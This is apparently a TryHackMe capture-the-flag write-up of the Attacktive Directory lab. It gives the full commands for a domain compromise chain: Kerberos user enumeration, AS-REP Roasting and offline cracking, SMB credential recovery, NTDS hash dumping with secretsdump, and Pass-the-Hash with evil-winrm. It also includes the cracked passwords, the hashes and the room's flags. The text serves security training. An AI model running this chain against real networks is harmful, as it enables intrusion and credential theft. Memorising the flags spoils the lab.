# Attacktive Directory – TryHackMe Writeup

## Overview

This report documents the compromise of the **Attacktive Directory** TryHackMe machine through Active Directory enumeration, Kerberos user discovery, AS-REP Roasting, SMB share enumeration, credential extraction, NTDS hash dumping, and Pass-the-Hash authentication.

The objective was to identify domain users, obtain valid credentials, escalate privileges within the Active Directory environment, and retrieve all challenge flags.

---

# Target Information

| Field        | Value                |
| ------------ | -------------------- |
| Platform     | TryHackMe            |
| Room Name    | Attacktive Directory |
| Target IP    | 10.49.164.155        |
| Domain       | spookysec.local      |
| NetBIOS Name | THM-AD               |

---

# Executive Summary

During the assessment, several Active Directory weaknesses were identified that allowed complete domain compromise.

The attack chain involved:

1. Enumerating Active Directory services.
2. Discovering the domain name.
3. Identifying valid domain users through Kerberos.
4. Performing AS-REP Roasting against a vulnerable account.
5. Cracking the recovered Kerberos hash.
6. Accessing an SMB backup share.
7. Recovering backup account credentials.
8. Dumping NTDS password hashes.
9. Performing Pass-the-Hash as Administrator.
10. Retrieving all challenge flags.

---

# Enumeration

## Host Discovery

Before interacting with the target, a network sweep was performed to identify active hosts.

```bash
nmap -sn 10.49.164.155/24
```

### Results

```text
10.49.180.99
10.49.180.209
```

---

## Service Enumeration

A targeted scan was performed against the provided machine.

```bash
nmap -p 88,135,139,389,445,636 -sV -sC 10.49.164.155
```

### Results

| Port | Service  |
| ---- | -------- |
| 88   | Kerberos |
| 135  | MSRPC    |
| 139  | NetBIOS  |
| 389  | LDAP     |
| 445  | SMB      |
| 636  | LDAPS    |

### Why These Ports Matter

These services are commonly found on Domain Controllers:

* **Kerberos (88)** handles domain authentication.
* **LDAP (389)** stores directory information.
* **SMB (445)** provides file sharing and domain communication.
* **MSRPC (135)** enables remote administrative operations.

Nmap also revealed:

```text
Domain: spookysec.local
Host: ATTACKTIVEDIREC
```

This confirmed the machine was functioning as an Active Directory Domain Controller.

---

# Domain Enumeration

## Enum4Linux

Additional SMB enumeration was performed.

```bash
enum4linux -a 10.49.164.155
```

### Findings

```text
Domain Name: THM-AD
Domain SID:
S-1-5-21-3591857110-2884097990-301047963
```

The room hinted that many organizations use:

```text
.local
```

as an internal Active Directory TLD.

Combining the information discovered:

```text
spookysec.local
```

was identified as the Active Directory domain.

---

# Kerberos User Enumeration

A user list was provided by the room.

The next objective was determining which usernames actually existed within Active Directory.

```bash
kerbrute userenum \
--dc 10.49.164.155 \
-d spookysec.local \
userlist.txt
```

### Why This Works

Kerberos responds differently when:

* A username exists.
* A username does not exist.

Kerbrute abuses these responses to enumerate valid domain accounts without authentication.

### Valid Users Discovered

```text
administrator
svc-admin
backup
james
robin
darkstar
paradox
```

Among these, two accounts immediately stood out:

```text
svc-admin
backup
```

Service accounts and backup accounts frequently possess elevated privileges.

---

# AS-REP Roasting

## Checking for Vulnerable Accounts

The next step was testing whether any users had Kerberos pre-authentication disabled.

```bash
impacket-GetNPUsers \
spookysec.local/ \
-usersfile validUsers.txt \
-dc-ip 10.49.164.155 \
-no-pass
```

### Why This Works

Normally Kerberos requires a user to prove knowledge of their password before receiving authentication material.

If pre-authentication is disabled:

* Anyone can request encrypted authentication data.
* The encrypted response can be cracked offline.

This attack is known as:

```text
AS-REP Roasting
```

### Vulnerable Account

```text
svc-admin
```

### Hash Obtained

```text
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:53856fecb121c6bbc89a0f0226b50e9f$be25646c48815ef1587e03be285cac4cddb3586bc18b4fea8d8ad42514ddbc64f77170733fafa15d645fc74ae80bf2764857aa14e1d902f8e4b02e2d32afe6f7a10eff480613b9bebf0810d47f1704bcd695295006a78c3b26ab93a4df09bcca879e8cff26ba7f66a2d01beb1ae365a06b2a805bdaa3766acb675c3b6b8b1b33d86def6c9b5ad46125f5ae7d595b205d016df96f0d988a10b6b115fb35636d683bdc2c067470f7521953aca33d50c18922cf44a1324f1a78cb5efa4292419e7b3f39b86dccc35af95030ad7cb7373e574f434f179c916cdef206940416264e9487a5eadbd90cac30491ea4d2dcae8ac4d8ce
```

---

# Cracking the Kerberos Hash

The hash was saved locally in ```hash.txt```.

```bash
john hash.txt \
--wordlist=/usr/share/wordlists/rockyou.txt
```

### Result

```text
management2005
```

### Credentials

```text
svc-admin : management2005
```

---

# SMB Enumeration

Using the recovered credentials, SMB shares were explored.

```bash
smbclient //10.49.164.155/backup -U svc-admin
```

### Files

```text
backup_credentials.txt
```

The file was downloaded.

```bash
get backup_credentials.txt
```

---

# Credential Discovery

Contents:

```text
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
```

The string appeared to be Base64 encoded.

Decoding:

```bash
echo 'YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw' | base64 -d
```

### Result

```text
backup@spookysec.local:backup2517860
```

---

# Backup Account Abuse

## Why the Backup Account Is Important

Backup accounts often possess permissions allowing synchronization of Active Directory data.

These permissions can be abused to extract password hashes from the Domain Controller.

---

# Dumping NTDS Password Hashes

Using the recovered credentials:

```bash
impacket-secretsdump \
spookysec.local/backup:backup2517860@10.49.164.155
```

### Why This Works

The backup account possessed privileges equivalent to:

```text
Replicating Directory Changes
```

This allowed retrieval of password hashes stored inside:

```text
NTDS.dit
```

the Active Directory database.

---

## Administrator Hash

```text
Administrator:
0e0363213e37b94221497260b0bcb4fc
```

---

# Pass-the-Hash Attack

Instead of cracking the Administrator password, the NTLM hash itself was used for authentication.

```bash
evil-winrm \
-i 10.49.164.155 \
-u administrator \
-H 0e0363213e37b94221497260b0bcb4fc
```

### Why This Works

Windows authentication often accepts:

* Passwords
* NTLM hashes

If a valid NTLM hash is known, authentication can succeed without ever knowing the plaintext password.

This technique is known as:

```text
Pass-the-Hash (PtH)
```

---

# User Flag

After obtaining Administrator access, user directories were inspected.

```powershell
C:\Users\svc-admin\Desktop
```

### Flag

```text
TryHackMe{K3rb3r0s_Pr3_4uth}
```

---

# Privilege Escalation Flag

Navigating to:

```powershell
C:\Users\backup\Desktop
```

### Flag

```text
TryHackMe{B4ckM3UpSc0tty!}
```

---

# Root Flag

Navigating to:

```powershell
C:\Users\Administrator\Desktop
```

### Flag

```text
TryHackMe{4ctiveD1rectoryM4st3r}
```

---

# Findings & Vulnerabilities

| ID   | Finding                                                 | Severity |
| ---- | ------------------------------------------------------- | -------- |
| F-01 | Domain User Enumeration via Kerberos                    | Medium   |
| F-02 | Kerberos Pre-Authentication Disabled                    | High     |
| F-03 | Weak Service Account Password                           | High     |
| F-04 | Credentials Stored in Accessible SMB Share              | High     |
| F-05 | Excessive Permissions Assigned to Backup Account        | Critical |
| F-06 | NTDS Database Accessible Through Replication Rights     | Critical |
| F-07 | Administrator Authentication Possible via Pass-the-Hash | Critical |

---

# Tools Used

### Enumeration

* Nmap
* Enum4Linux

### Active Directory Enumeration

* Kerbrute
* Impacket GetNPUsers

### Credential Access

* John the Ripper
* Base64

### SMB Enumeration

* SMBClient

### Credential Dumping

* Impacket SecretsDump

### Remote Access

* Evil-WinRM

---

# Flags Obtained

| Flag         | Value                            |
| ------------ | -------------------------------- |
| User Flag    | TryHackMe{K3rb3r0s_Pr3_4uth}     |
| PrivEsc Flag | TryHackMe{B4ckM3UpSc0tty!}       |
| Root Flag    | TryHackMe{4ctiveD1rectoryM4st3r} |

---

# Conclusion

The compromise of the Attacktive Directory environment was achieved through a chain of common Active Directory misconfigurations. Kerberos user enumeration exposed valid domain accounts, while disabled pre-authentication on a service account enabled AS-REP Roasting and credential recovery. Access to an SMB backup share revealed additional credentials, leading to abuse of replication privileges and extraction of NTDS password hashes. Finally, Pass-the-Hash authentication provided full Administrator access, resulting in complete domain compromise.
